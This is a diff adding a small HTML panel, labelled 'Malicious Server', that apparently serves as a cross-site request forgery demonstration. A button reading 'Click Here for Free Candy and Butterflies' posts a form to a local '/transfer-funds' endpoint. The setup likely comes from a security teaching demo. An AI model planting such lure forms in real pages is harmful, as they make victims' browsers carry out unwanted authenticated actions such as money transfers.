@@ -1,0 +1,14 @@
+<div class="panel panel-default">
+    <div class="panel-heading">
+        <h3 class="panel-title">Malicious Server</h3>
+    </div>
+    <div class="panel-body">
+
+        <form method="post" action="http://localhost:7000/transfer-funds">
+            <button type="submit" class="btn btn-primary">
+                Click Here for Free Candy and Butterflies
+            </button>
+        </form>
+
+    </div>
+</div>
